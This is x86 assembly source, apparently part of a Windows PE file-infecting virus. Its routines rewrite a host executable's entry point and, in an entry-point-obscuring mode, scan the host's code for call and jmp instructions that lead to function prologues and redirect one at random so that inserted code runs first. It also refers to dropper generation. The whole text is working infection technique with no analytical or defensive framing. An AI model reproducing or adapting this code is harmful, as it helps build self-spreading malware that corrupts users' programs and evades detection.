;ebx=imagebase
;eax=insert rva

epo_trick:
IF EPO EQ TRUE
       cmp by [droppergen],0        ;droppers dont use EPO
       je @@use_epo
ENDIF
       mov esi, [peheader]              ;change entrypoint
       xchg eax, [esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
       add eax,ebx
       mov [entrypoint],eax     ;save old entrypoint
       mov ebx,[_1st_item]            ;get first instruction(entry) new offset
       add [esi.NT_OptionalHeader.OH_AddressOfEntryPoint],ebx
       ret

IF EPO EQ TRUE
  @@use_epo:
       push ebx

       mov ebx,[fmap]
       call rva2raw
       add eax,[_1st_item]
       add ebx,eax

       push dwo [epo_cnt]
       call rnd
       mov ecx,[esp+eax*4+8]
       add ecx,5

       sub ebx,ecx
       xchg [ecx-4],ebx
       add ebx,ecx

       mov eax,[peheader]
       mov eax,[eax.SIZE IMAGE_NT_HEADERS.SH_VirtualAddress]
       add ebx,eax
       call rva2raw
       sub ebx,eax
       sub ebx,[fmap]
       pop eax
       add ebx,eax
       mov [entrypoint],ebx     ;save old returnpoint

       pop ecx
       mov eax,[epo_cnt]        ;clean stack list
       shl eax,2
       add esp,eax
       db 0ffh,0e1h             ;jmp ecx


epo_init:
       cmp by [droppergen],0
       je @@use_epo
       ret
  @@use_epo:
       mov esi,[peheader]
       mov eax,[esi.SIZE IMAGE_NT_HEADERS.SH_VirtualAddress]
       mov ecx,[esi.SIZE IMAGE_NT_HEADERS.SH_SizeOfRawData]
       call rva2raw
       pop esi
       xchg esi, eax
       add esi,[fmap]
       mov edi,esi
       lea ebx,[ecx+edi]

       mov dwo [epo_cnt],0

  @@scan_code:
       mov edx,[esi]
       cmp dl, 0e8h                             ;call
       je @@check_reldistance
       cmp dl, 0e9h                             ;jmp
       jnz @@isnt_hookeable
  @@check_reldistance:
       mov edx,[esi+1]
       add edx,esi
       add edx,5
       cmp edx,edi
       jc @@isnt_hookeable
       cmp edx,ebx
       jnc @@isnt_hookeable                     ;check relative distance

  @@check_opcode:
       cmp by [edx], 12h
     org $-1
       push ebp
       jne @@no_stackframe1
       cmp wo [edx+1], 1234h
     org $-2
       mov ebp,esp
       je @@add2hooklist

  @@no_stackframe1:
       cmp by [edx], 0c8h
       je @@add2hooklist

       cmp by [edx], 0e9h
       je @@add2hooklist
       cmp by [edx], 0e8h
       je @@add2hooklist
       cmp wo [edx], 025ffh
       je @@add2hooklist
       cmp wo [edx], 015ffh
       jne @@isnt_hookeable

  @@add2hooklist:
       push esi
       inc dwo [epo_cnt]
  @@isnt_hookeable:
       inc esi
       loop @@scan_code

       db 0ffh, 0e0h                   ;jmp eax
ENDIF
